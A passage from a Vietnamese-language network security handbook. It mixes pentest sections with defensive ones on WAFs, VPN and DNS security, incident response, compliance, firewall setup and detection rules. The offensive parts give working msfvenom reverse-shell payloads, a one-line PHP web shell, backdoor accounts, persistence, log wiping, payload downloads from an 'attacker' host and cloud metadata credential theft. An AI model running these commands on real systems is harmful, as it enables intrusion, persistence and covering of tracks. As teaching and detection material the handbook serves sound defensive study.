# → Victim đăng nhập bình thường (thấy real site)
# → Evilginx capture session cookie → bypass MFA

# Phòng chống: FIDO2/WebAuthn (hardware key), token binding
```

## 27.4 Msfvenom - Payload Generation

```bash
# === Staged vs Stageless ===
# Staged (windows/meterpreter/reverse_tcp): Gửi stager nhỏ trước, download full payload sau
# Stageless (windows/meterpreter_reverse_tcp): Full payload trong 1 file (lớn hơn nhưng reliable hơn)

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f asp -o shell.asp
msfvenom -p cmd/unix/reverse_python LHOST=attacker LPORT=4444 -f raw

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll

# Encoders (basic evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Listener (Metasploit)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker
set LPORT 4444
exploit
```

## 27.5 Web Shells

```bash
# === p0wny-shell (PHP) ===
# Single file, interactive terminal in browser
# https://github.com/flozz/p0wny-shell
# Upload p0wny.php → access via browser

# === weevely (Python + PHP) ===
# Generate agent
weevely generate password agent.php
# Upload agent.php to target
# Connect
weevely http://target.com/agent.php password

# === China Chopper ===
# 1-line PHP: <?php @eval($_POST['pass']); ?>
# Client connects and sends commands via POST

# === SharPyShell (ASPX) ===
# Encrypted .NET web shell
python SharPyShell.py generate -p password
# Upload to IIS → connect
```

---

# PHẦN 28: POST-EXPLOITATION & PERSISTENCE

> **CẢNH BÁO**: Post-exploitation và persistence techniques CHỈ cho authorized pentest. Cài persistence trái phép = backdoor = vi phạm nghiêm trọng.

## 28.1 Token Impersonation & Privilege Escalation

```bash
# === Potato Family (Service Account → SYSTEM) ===
# Exploit SeImpersonatePrivilege

# JuicyPotato (Windows Server 2016/2019)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato (Latest, works on newest Windows)
GodPotato.exe -cmd "cmd /c whoami"

# Sweet Potato (all-in-one)
SweetPotato.exe -p cmd.exe

# === Incognito (Token Impersonation) ===
# Trong Meterpreter:
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "DOMAIN\\Administrator"
```

## 28.2 Persistence Techniques

```bash
# === Windows Persistence ===

# Registry Run Key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe"

# Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM

# Service
sc create Updater binPath= "C:\payload.exe" start= auto
sc start Updater

# WMI Event Subscription (stealthy)
# Filter + Consumer + Binding → execute payload on event
# Ví dụ: Execute khi user login, khi process start, mỗi X phút

# Startup Folder
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# DLL Hijacking / DLL Search Order
# Place malicious DLL where application searches before legitimate DLL

# COM Object Hijacking
# Modify registry CLSID → point to malicious DLL

# Golden Ticket / Silver Ticket → xem Phần 14

# === Linux Persistence ===

# Crontab
(crontab -l; echo "*/5 * * * * /tmp/shell.sh") | crontab -

# SSH Authorized Keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Backdoor user
useradd -ou 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Systemd service
# /etc/systemd/system/backdoor.service
[Unit]
Description=System Service
[Service]
ExecStart=/tmp/shell.sh
Restart=always
[Install]
WantedBy=multi-user.target

# .bashrc / .profile
echo '/tmp/shell.sh &' >> /root/.bashrc

# SUID binary
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden
# Execute: /tmp/.hidden -p
```

## 28.3 Anti-Forensics

```bash
# === Log Clearing ===
# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
# PowerShell
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }

# Linux
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c && history -w

# === Timestomping ===
# Modify file timestamps (MACE: Modified, Accessed, Created, Entry)
# Metasploit:
meterpreter> timestomp secret.txt -m "01/01/2020 00:00:00"

# Linux:
touch -t 202001010000 secret.txt

# === LOLBins (Living Off the Land Binaries) ===
# Dùng binary có sẵn trong OS → ít bị phát hiện

# Download file:
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\payload.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\payload.exe')"
curl http://attacker/payload.exe -o payload.exe   # Windows 10+

# Execute:
rundll32 payload.dll,EntryPoint
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
mshta http://attacker/payload.hta
wmic process call create "payload.exe"

# Encode/Decode:
certutil -encode payload.exe encoded.txt
certutil -decode encoded.txt payload.exe

# Reference: https://lolbas-project.github.io (Windows)
# Reference: https://gtfobins.github.io (Linux)
```

---

# PHẦN 29: WAF, VPN & DNS SECURITY

## 29.1 WAF (Web Application Firewall) Chi tiết

### ModSecurity

```bash
# ModSecurity = Open source WAF engine
# Chạy như module cho Apache, Nginx, IIS

# Cài đặt (Apache)
apt install libapache2-mod-security2
cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
# Đổi: SecRuleEngine DetectionOnly → SecRuleEngine On

# OWASP Core Rule Set (CRS)
git clone https://github.com/coreruleset/coreruleset.git
cp coreruleset/crs-setup.conf.example /etc/modsecurity/crs-setup.conf
cp -r coreruleset/rules/ /etc/modsecurity/

# Paranoia Levels:
# PL1 (default): Ít false positive, bỏ lỡ một số attack
# PL2: Thêm rules, nhiều false positive hơn
# PL3: Aggressive, cần tuning
# PL4: Maximum, rất nhiều false positive

# SecRule syntax:
# SecRule VARIABLE OPERATOR "ACTIONS"
SecRule ARGS "@contains <script>" "id:1001,phase:2,deny,status:403,msg:'XSS Detected'"
SecRule REQUEST_URI "@rx /(etc|proc)/" "id:1002,phase:1,deny,msg:'Path Traversal'"
```

### WAF Bypass Techniques

```
1. Encoding:
   <script> → %3Cscript%3E (URL encode)
   <script> → %253Cscript%253E (double encode)
   <script> → &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62; (HTML entities)

2. Case variation:
   <ScRiPt> → bypass case-sensitive rules

3. Chunked Transfer:
   Transfer-Encoding: chunked
   → Chia payload thành chunks nhỏ

4. HTTP Parameter Pollution:
   ?id=1&id=UNION SELECT... → WAF check param 1, app dùng param 2

5. JSON/XML obfuscation:
   {"query": "admin' OR '1'='1"} → WAF miss nếu chỉ check URL params

6. Null bytes / special chars:
   admin%00' OR 1=1-- → null byte confuse WAF parser

7. Alternate syntax:
   SQL: UNION SELECT → UNI/**/ON SEL/**/ECT
   XSS: <img src=x onerror=alert(1)> → <img/src=x onerror=alert(1)>

8. Request smuggling:
   Desync frontend (WAF) and backend → WAF doesn't see the attack
```

## 29.2 VPN Security Issues

```
=== Split Tunneling ===
Split tunnel: Chỉ traffic đến corporate network đi qua VPN
Full tunnel: TẤT CẢ traffic đi qua VPN

Risk: Split tunnel → traffic ra Internet KHÔNG encrypted
→ Attacker trên local network có thể sniff non-VPN traffic

=== DNS Leak ===
Nguyên lý: VPN tunnel active nhưng DNS queries vẫn đi qua ISP DNS
→ ISP thấy domain bạn truy cập
Test: https://dnsleaktest.com

Fix:
  - Force DNS qua VPN tunnel
  - Block non-VPN DNS (iptables/firewall)
  - VPN client DNS leak protection setting

=== WebRTC Leak ===
WebRTC (browser feature) có thể reveal real IP qua STUN request
→ Dù đang dùng VPN, website biết IP thật

Test: https://browserleaks.com/webrtc
Fix: Disable WebRTC trong browser
  Firefox: media.peerconnection.enabled = false
  Chrome: uBlock Origin extension → block WebRTC

=== VPN Kill Switch ===
Nếu VPN disconnect → traffic đi ra KHÔNG encrypted
Kill switch = block TẤT CẢ traffic khi VPN down

# Linux iptables kill switch:
iptables -P OUTPUT DROP
iptables -A OUTPUT -o tun0 -j ACCEPT           # VPN interface OK
iptables -A OUTPUT -o eth0 -p udp --dport 1194 -j ACCEPT  # Allow VPN connection
iptables -A OUTPUT -o lo -j ACCEPT              # Loopback OK
```

## 29.3 DNS Security

### DNSSEC (DNS Security Extensions)

```
Nguyên lý: Ký DNS records bằng cryptographic signatures
→ Client verify: response đến từ authoritative server, không bị tamper

Components:
  RRSIG:   Signature cho DNS record
  DNSKEY:  Public key để verify signature
  DS:      Hash of DNSKEY (stored ở parent zone)
  NSEC/NSEC3: Prove record KHÔNG tồn tại (authenticated denial)

Chain of Trust:
  Root → .com → example.com
  Mỗi level ký DS record cho level dưới

# Kiểm tra DNSSEC
dig +dnssec example.com
dig DNSKEY example.com
dig DS example.com @parent-ns

# Limitation: DNSSEC KHÔNG encrypt DNS queries
# → Vẫn bị sniffing. Chỉ đảm bảo integrity và authenticity.
```

### DoT & DoH

```
DNS over TLS (DoT):
  Port: TCP 853
  Encrypt DNS queries giữa client → resolver
  Dễ block (port 853 dễ nhận diện)

DNS over HTTPS (DoH):
  Port: TCP 443 (cùng HTTPS traffic)
  DNS queries đi trong HTTPS requests
  KHÓ block (lẫn vào HTTPS traffic thường)

# Security monitoring tradeoff:
# DoT/DoH = privacy tốt cho user
# NHƯNG = mù cho security team (không thể inspect DNS queries)
# → Enterprise thường block DoH và force DNS qua internal resolver

# Resolver hỗ trợ:
# Cloudflare: 1.1.1.1 (DoT + DoH)
# Google: 8.8.8.8 (DoT + DoH)
# Quad9: 9.9.9.9 (DoT + DoH + malware filtering)
```

---

# PHẦN 30: CLOUD SECURITY NÂNG CAO

## 30.1 GCP (Google Cloud Platform) Networking

```
VPC: Global (không giới hạn region như AWS)
Subnets: Regional (không per-AZ)
Firewall Rules: VPC-level (không per-instance như AWS SG)
  - Default: deny all ingress, allow all egress
  - Priority-based (0-65535, lower = higher priority)
  - Target: tags, service accounts, all instances
Cloud NAT: Managed NAT gateway
Cloud Armor: WAF + DDoS protection (L7)
Cloud Load Balancing: Global, Anycast
VPC Peering, Shared VPC, VPN, Interconnect

# Common misconfigs:
# Firewall rule 0.0.0.0/0 allow all
# Service account keys exposed
# Cloud Storage bucket public
# Metadata server (169.254.169.254) → steal service account token
```

## 30.2 Cloud-Specific Attacks

```bash
# === IMDS (Instance Metadata Service) ===
# AWS IMDSv1 (vulnerable to SSRF):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# → Returns temporary AWS credentials!

# IMDSv2 (requires PUT token):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP Metadata:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# === VPC Flow Logs Analysis ===
# AWS: CloudWatch Logs / S3 / Athena
# Format: version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status

# Athena query: Find SSH brute force
SELECT srcaddr, count(*) as attempts
FROM vpc_flow_logs
WHERE dstport = 22 AND action = 'REJECT'
GROUP BY srcaddr
HAVING count(*) > 100
ORDER BY attempts DESC;

# Athena query: Large data transfers (exfiltration?)
SELECT srcaddr, dstaddr, sum(bytes) as total_bytes
FROM vpc_flow_logs
WHERE action = 'ACCEPT'
GROUP BY srcaddr, dstaddr
HAVING sum(bytes) > 1000000000
ORDER BY total_bytes DESC;
```

## 30.3 AWS WAF

```
# AWS WAF Rules
# Managed rule groups: AWSManagedRulesCommonRuleSet, SQLi, XSS
# Custom rules: Rate-based, IP match, regex, geo match

# AWS WAF + CloudFront / ALB
# Rate limiting:
{
  "Name": "RateLimit",
  "Priority": 1,
  "Action": { "Block": {} },
  "Statement": {
    "RateBasedStatement": {
      "Limit": 1000,
      "AggregateKeyType": "IP"
    }
  }
}
```

---

# PHẦN 31: MONITORING, IR & FORENSICS NÂNG CAO

## 31.1 Network Monitoring Tools

### Prometheus + Grafana

```yaml
# Prometheus: Time-series metrics collection
# Grafana: Visualization dashboards

# SNMP Exporter (monitor network devices)
# prometheus.yml:
scrape_configs:
  - job_name: 'snmp'
    static_configs:
      - targets: ['192.168.1.1']    # Switch/Router IP
    metrics_path: /snmp
    params:
      module: [if_mib]

# Blackbox Exporter (probe endpoints)
  - job_name: 'blackbox'
    metrics_path: /probe
    params:
      module: [http_2xx]
    static_configs:
      - targets:
        - http://example.com
        - https://internal-app:8080

# Alert example (AlertManager):
groups:
  - name: network
    rules:
      - alert: HighPacketLoss
        expr: probe_success == 0
        for: 5m
        labels:
          severity: critical
```

### Nagios / Zabbix

```
Nagios:
  - Agent-based + agentless monitoring
  - Plugins: check_ping, check_tcp, check_snmp
  - Alerting: email, SMS, webhook

Zabbix:
  - Agent-based + SNMP + IPMI
  - Auto-discovery
  - Network topology maps
  - Better scalability than Nagios

# Zabbix SNMP monitoring:
# Configuration → Hosts → Create Host
# Add SNMP interface
# Link template: "Template Net Network Generic Device SNMPv2"
# → Auto-discovers interfaces, bandwidth, errors
```

## 31.2 Memory Forensics (Network Artifacts)

```bash
# === Volatility 3 ===
# Extract network connections from memory dump

# List network connections
vol -f memory.dmp windows.netscan
vol -f memory.dmp windows.netstat

# Output: PID, Protocol, Local Address, Foreign Address, State, Created
# → Tìm: Connections đến C2, unusual ports, suspicious IPs

# Linux memory
vol -f memory.lime linux.sockstat

# DNS cache from memory
vol -f memory.dmp windows.dnsresolver

# Browser history from memory
vol -f memory.dmp windows.filescan | grep -i "history"
```

## 31.3 Network Incident Response

### IR Playbooks

```
=== DDoS Response ===
1. Identify: Traffic spike, service unavailable
2. Classify: Volumetric / Protocol / Application
3. Contain:
   - Enable rate limiting
   - Activate CDN / scrubbing service
   - Blackhole routing (last resort)
   - GeoIP blocking (nếu attack từ specific region)
4. Eradicate: Work with ISP/upstream
5. Recover: Monitor, gradually remove blocks
6. Lessons learned: Improve DDoS protection

=== Lateral Movement Detected ===
1. Identify: Unusual SMB/WinRM/RDP connections, PtH attempts
2. Contain:
   - Isolate compromised host (VLAN quarantine hoặc disable switch port)
   - Block lateral movement at firewall
   - Disable compromised accounts
   - Reset Kerberos tickets (krbtgt reset 2 lần)
3. Eradicate: Clean compromised hosts, patch vulnerability
4. Recover: Re-enable services, monitor closely

=== Containment Strategies ===
VLAN Isolation: Move compromised host to quarantine VLAN
ACL Quarantine: Block specific traffic at firewall/switch
DNS Sinkholing: Redirect malicious domains to internal server
Port Shutdown: Disable switch port of compromised device
Network Segment Disconnection: Isolate entire segment
```

## 31.4 Threat Intelligence

```
=== IOC Types ===
Network IOCs:
  - IP address (C2 server, scanner)
  - Domain (phishing, C2)
  - URL (malware download, phishing page)
  - JA3/JA3S hash (TLS client/server fingerprint)
  - User-Agent string

Host IOCs:
  - File hash (MD5, SHA1, SHA256)
  - File path
  - Registry key
  - Mutex name
  - Process name

=== Threat Feeds ===
AlienVault OTX:  https://otx.alienvault.com (free, community)
Abuse.ch:        https://abuse.ch (malware, botnet, SSL blacklist)
VirusTotal:      https://virustotal.com (file/URL/IP analysis)
ThreatFox:       https://threatfox.abuse.ch (IOC database)
URLhaus:         https://urlhaus.abuse.ch (malicious URLs)

=== STIX / TAXII ===
STIX (Structured Threat Information eXpression):
  JSON format cho threat intelligence sharing
  Objects: Indicator, Malware, Attack Pattern, Campaign, Threat Actor

TAXII (Trusted Automated eXchange of Indicator Information):
  Transport protocol cho STIX data
  Collections: Channel, Discovery, API Root

# Dùng trong SIEM: Import threat feeds → auto-correlate với logs
```

## 31.5 Forensics - Chain of Custody

```
Quy trình thu thập evidence:
1. Identify: Xác định evidence (logs, pcap, disk image, memory)
2. Preserve: Tạo forensic copy (bit-for-bit)
   - Write blocker cho disk
   - dd hoặc FTK Imager
3. Document: Ghi chép mỗi bước
   - Ai thu thập, khi nào, ở đâu
   - Hash (SHA256) của evidence
   - Mỗi lần transfer → sign off
4. Analyze: Phân tích trên COPY, không bao giờ trên original
5. Present: Report findings

# Tạo forensic image
dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
sha256sum /dev/sda > /evidence/disk.img.sha256
sha256sum /evidence/disk.img >> /evidence/disk.img.sha256
# So sánh 2 hash phải giống nhau
```

---

# PHẦN 32: NETWORK AUTOMATION & COMPLIANCE

## 32.1 Ansible for Network

```yaml
# Ansible automate cấu hình network devices

# inventory.yml
all:
  children:
    switches:
      hosts:
        sw1:
          ansible_host: 192.168.1.10
          ansible_network_os: cisco.ios.ios
          ansible_connection: network_cli
          ansible_user: admin
          ansible_password: password

# playbook: configure_switch.yml
- name: Configure switch security
  hosts: switches
  tasks:
    - name: Disable unused ports
      cisco.ios.ios_interfaces:
        config:
          - name: GigabitEthernet0/10
            enabled: false
          - name: GigabitEthernet0/11
            enabled: false

    - name: Configure port security
      cisco.ios.ios_config:
        lines:
          - switchport port-security
          - switchport port-security maximum 2
          - switchport port-security violation restrict
        parents: interface GigabitEthernet0/1

    - name: Enable DHCP snooping
      cisco.ios.ios_config:
        lines:
          - ip dhcp snooping
          - ip dhcp snooping vlan 10,20

# Run:
ansible-playbook -i inventory.yml configure_switch.yml
```

### Terraform for Network Infrastructure

```hcl
# AWS VPC + Security Groups

resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  enable_dns_support = true
  enable_dns_hostnames = true
}

resource "aws_security_group" "web" {
  vpc_id = aws_vpc.main.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]  # SSH chỉ từ internal
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# IaC Security:
# Checkov, tfsec: Scan Terraform cho misconfigurations
# OPA (Open Policy Agent): Policy-as-code enforcement
# Drift detection: terraform plan → phát hiện manual changes
```

## 32.2 Compliance

### PCI DSS (Payment Card Industry)

```
Network Requirements:
  Req 1: Install and maintain firewall
    - DMZ for public-facing systems
    - No direct Internet → cardholder data environment
    - Personal firewall on mobile/employee devices
  Req 2: Do not use vendor-supplied defaults
    - Change default passwords
    - Disable unnecessary services
  Req 4: Encrypt transmission of cardholder data
    - TLS 1.2+ for public networks
  Req 10: Track and monitor all access
    - Log all access to cardholder data
    - Retain logs 1 year, 3 months immediately available
  Req 11: Regularly test security
    - Quarterly vulnerability scans (ASV)
    - Annual penetration test
    - IDS/IPS monitoring

# Network Segmentation: REQUIRED to reduce scope
# Only systems that store/process/transmit card data = in scope
# Proper segmentation → rest of network out of scope
```

### ISO 27001 (Annex A - Network Controls)

```
A.13.1 Network Security Management:
  A.13.1.1: Network controls (firewall, IDS, segmentation)
  A.13.1.2: Security of network services (SLAs, monitoring)
  A.13.1.3: Segregation in networks (VLAN, DMZ)

A.13.2 Information Transfer:
  A.13.2.1: Transfer policies (encryption, approved methods)
  A.13.2.3: Electronic messaging security (email encryption)
```

### SOC 2 (Trust Service Criteria)

```
CC6: Logical and Physical Access Controls
  - Network segmentation
  - Firewall rules review
  - VPN for remote access
  - MFA for privileged access

CC7: System Operations
  - Monitoring and detection (SIEM)
  - Incident response procedures
  - Vulnerability management

CC8: Change Management
  - Network change approval process
  - Firewall rule change documentation
```

## 32.3 SD-WAN & SASE

```
=== MPLS (Multiprotocol Label Switching) ===
Công nghệ WAN truyền thống, forward packets theo LABELS thay vì IP lookup.
- Router gán label (20-bit) cho packet tại ingress → forward theo label → strip tại egress
- Label Switched Path (LSP): Đường đi cố định qua mạng MPLS
- Ưu điểm: Nhanh (label lookup < IP lookup), QoS guarantees, VPN isolation
- Nhược điểm: ĐẮT (thuê riêng từ ISP), không flexible, không encrypt mặc định
- Bị thay thế dần bởi SD-WAN (rẻ hơn, dùng internet thường + encryption)

=== SD-WAN (Software-Defined WAN) ===
Overlay network trên multiple WAN links (MPLS, broadband, LTE)

Architecture:
  Underlay: Physical connections (ISP links)
  Overlay: Encrypted tunnels (IPsec/GRE)
  Controller: Centralized management (policy, routing)

Benefits:
  - Cheaper than MPLS
  - Application-aware routing (Office 365 → direct Internet)
  - Centralized management
  - Automatic failover

Security implications:
  - Traffic goes over Internet → needs encryption
  - Multiple paths → harder to monitor
  - Cloud integration → need consistent policy

Vendors: Cisco Viptela, Fortinet, VMware VeloCloud, Silver Peak

=== SASE (Secure Access Service Edge) ===
= SD-WAN + Cloud Security (all-in-one)

Components:
  SD-WAN:   WAN optimization
  FWaaS:    Firewall as a Service
  CASB:     Cloud Access Security Broker
  ZTNA:     Zero Trust Network Access
  SWG:      Secure Web Gateway

→ Single cloud service cho cả networking + security
→ Edge-based (close to user, not datacenter)
→ Identity-based access (not IP-based)

Vendors: Zscaler, Palo Alto Prisma, Cloudflare One, Netskope

# Khi nào dùng:
# Remote workforce lớn
# Multi-cloud environment
# Branch offices without on-prem security stack
```

## 32.4 Microsegmentation Implementation

```
Microsegmentation: Firewall từng workload (không chỉ subnet)

Traditional Segmentation:
  [VLAN 10] ←firewall→ [VLAN 20]
  Trong cùng VLAN → tất cả trust nhau → lateral movement dễ

Microsegmentation:
  Mỗi VM/container có policy riêng
  Workload A chỉ nói chuyện được với Workload B trên port 443
  Mọi traffic khác → deny

Tools:
  VMware NSX: Distributed firewall per VM
  Illumio: Agent-based, application-aware
  Guardicore (Akamai): Agent + network-based
  Cilium: eBPF-based cho Kubernetes (xem Phần 23)

Implementation steps:
  1. Discover: Map tất cả communication flows
  2. Visualize: Dependency map (ai nói chuyện với ai)
  3. Policy: Define allowed flows
  4. Test: Monitor mode trước (alert, không block)
  5. Enforce: Block unauthorized flows
  6. Maintain: Continuous monitoring + policy updates
```

---

# PHẦN 33: UFW, FIREWALLD & SUPPLEMENTAL FIREWALLS

## 33.1 UFW (Uncomplicated Firewall) - Ubuntu/Debian

```bash
# UFW = Frontend đơn giản cho iptables

# Bật/tắt
sudo ufw enable
sudo ufw disable
sudo ufw status verbose

# Default policy
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Cho phép services
sudo ufw allow ssh                    # Port 22
sudo ufw allow http                   # Port 80
sudo ufw allow https                  # Port 443
sudo ufw allow 8080/tcp

# Cho phép từ IP cụ thể
sudo ufw allow from 192.168.1.100
sudo ufw allow from 192.168.1.0/24 to any port 22

# Deny
sudo ufw deny from 10.10.10.100

# Delete rule
sudo ufw delete allow 8080/tcp
sudo ufw status numbered
sudo ufw delete 3                     # Xóa rule số 3

# Rate limiting (SSH brute force protection)
sudo ufw limit ssh

# Application profiles
sudo ufw app list
sudo ufw allow 'Nginx Full'

# Logging
sudo ufw logging on
sudo ufw logging high
# Logs: /var/log/ufw.log
```

## 33.2 firewalld (CentOS/RHEL/Fedora)

```bash
# firewalld dùng zones thay vì chains

# Status
sudo firewall-cmd --state
sudo firewall-cmd --list-all

# Zones: drop, block, public, external, dmz, work, home, internal, trusted
sudo firewall-cmd --get-zones
sudo firewall-cmd --get-active-zones
sudo firewall-cmd --get-default-zone

# Thêm service
sudo firewall-cmd --zone=public --add-service=http --permanent
sudo firewall-cmd --zone=public --add-service=https --permanent

# Thêm port
sudo firewall-cmd --zone=public --add-port=8080/tcp --permanent

# Rich rules (nâng cao)
sudo firewall-cmd --zone=public --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" port port="22" protocol="tcp" accept' --permanent

# Block IP
sudo firewall-cmd --zone=public --add-rich-rule='rule family="ipv4" source address="10.10.10.100" drop' --permanent

# Port forwarding
sudo firewall-cmd --zone=public --add-forward-port=port=80:proto=tcp:toport=8080 --permanent

# Masquerading (NAT)
sudo firewall-cmd --zone=public --add-masquerade --permanent

# Reload (apply permanent changes)
sudo firewall-cmd --reload

# Runtime vs Permanent:
# Không có --permanent → chỉ tồn tại đến reboot
# Có --permanent → cần --reload để apply
```

---

# PHẦN 34: BLUE TEAM - DETECTION SIGNATURES

> Mỗi kỹ thuật tấn công đều có dấu vết. Phần này dạy bạn PHÁT HIỆN chúng.

## 34.1 Windows Event IDs quan trọng

```
Event ID   Log           Ý nghĩa
─────────  ────────────  ──────────────────────────────────────
4624       Security      Logon thành công
4625       Security      Logon thất bại (brute force indicator)
4648       Security      Logon with explicit credentials (runas, PsExec)
4672       Security      Special privileges assigned (admin logon)
4720       Security      User account created
4732       Security      User added to local group
4768       Security      Kerberos TGT requested (AS-REQ)
4769       Security      Kerberos service ticket requested (TGS-REQ) → Kerberoasting
4771       Security      Kerberos pre-authentication failed → Brute force indicator
4776       Security      NTLM authentication (credential validation)
5140       Security      Network share accessed
5145       Security      Detailed file share access
7045       System        New service installed → persistence / PsExec
4688       Security      Process created (cần enable command line logging)
4698       Security      Scheduled task created → persistence
1102       Security      Audit log cleared → anti-forensics!
4662       Security      Directory service object accessed → DCSync
4742       Security      Computer account changed → ZeroLogon / noPac

Sysmon Events (cần install Sysmon):
1    Process Create (with command line + parent process + hash)
3    Network Connection (process → IP:port)
7    Image Loaded (DLL loading)
8    CreateRemoteThread (process injection)
10   Process Accessed (credential dumping: lsass.exe)
11   File Created
13   Registry modification
22   DNS Query
```

## 34.2 Detection per Attack Technique

```
=== Kerberoasting Detection ===
Event: 4769 (TGS-REQ) với Ticket Encryption Type = 0x17 (RC4)
       cho nhiều SPNs từ cùng 1 user trong thời gian ngắn
Sigma rule:
  logsource: windows/security
  detection:
    selection:
      EventID: 4769
      TicketEncryptionType: '0x17'
    filter:
      ServiceName|endswith: '$'    # machine accounts (loại trừ)
    condition: selection and not filter | count(ServiceName) by TargetUserName > 5
    timeframe: 1h

=== AS-REP Roasting Detection ===
Event: 4768 với Result Code = 0x0 (success)
       VÀ Ticket Encryption Type = 0x17 (RC4)
       cho user có "Do not require pre-auth" enabled

=== DCSync Detection ===
Event: 4662 với Properties chứa:
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes)
  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes-All)
VÀ Subject không phải Domain Controller
→ Non-DC requesting replication = DCSync!

=== Pass-the-Hash Detection ===
Event: 4624 với Logon Type 3 (Network)
       VÀ Authentication Package = NTLM
       VÀ Source ≠ expected workstation

=== Golden Ticket Detection ===
Event: 4769 với Account Domain = blank/mismatch
       VÀ ticket lifetime bất thường (mặc định 10 năm cho golden ticket)

=== PsExec Detection ===
Event: 7045 (Service installed) + 5145 (Share access to ADMIN$)
       Service name: random letters hoặc "PSEXESVC"
       Sysmon Event 1: process parent = services.exe

=== Responder / LLMNR Poisoning Detection ===
Sysmon Event 22: DNS query for WPAD
Network: LLMNR response từ non-DNS server IP
Event: 4648 (explicit credentials) đến unusual IP

=== ARP Spoofing Detection ===
Wireshark: arp.duplicate-address-detected
Network monitoring: Cùng IP → nhiều MAC addresses khác nhau
Tool: arpwatch alerts

=== Lateral Movement (WinRM/WMI) ===
Event: 4624 Logon Type 3 + 4648 explicit credentials
WinRM: Event 91 (WSMan session created)
WMI: Event 5857 (WMI activity) + Sysmon Event 1 (wmiprvse.exe parent)

=== Data Exfiltration via DNS ===
DNS query length > 50 characters
High volume DNS TXT requests
DNS queries to unusual TLDs
Subdomain entropy analysis (random = suspicious)
```

## 34.3 Sigma Rules & SIEM Queries

```bash
# === Splunk: Detect brute force ===
index=wineventlog EventCode=4625
| stats count by src_ip, TargetUserName
| where count > 10
| sort -count

# === Splunk: Detect Kerberoasting ===
index=wineventlog EventCode=4769 TicketEncryptionType=0x17
| stats count by TargetUserName, ServiceName
| where count > 3

# === Splunk: Detect PsExec ===
index=wineventlog (EventCode=7045 ServiceName="PSEXESVC")
OR (EventCode=5145 ShareName="\\\\*\\ADMIN$")

# === ELK/Kibana: Detect DCSync ===
event.code: 4662 AND winlog.event_data.Properties: *1131f6ad*
AND NOT winlog.event_data.SubjectUserName: *$

# === Sigma rule file format ===
title: Kerberoasting Activity
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
  timeframe: 1h
  count(ServiceName) by TargetUserName > 5
level: high
tags:
  - attack.credential_access
  - attack.t1558.003
```

---

# PHẦN 35: COMPLETE ATTACK CHAINS

> Các kỹ thuật riêng lẻ → chuỗi tấn công hoàn chỉnh.
> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**

## 35.1 External to Domain Admin - Full Chain

```
Scenario: Pentest external → internal network → Domain Admin

═══════════════════════════════════════════════════════
PHASE 1: EXTERNAL RECON
═══════════════════════════════════════════════════════

# Subdomain enumeration
subfinder -d target.com -silent -o subs.txt
amass enum -passive -d target.com >> subs.txt
sort -u subs.txt -o subs.txt

# Check alive
cat subs.txt | httpx -silent -status-code -title -tech-detect -o alive.txt

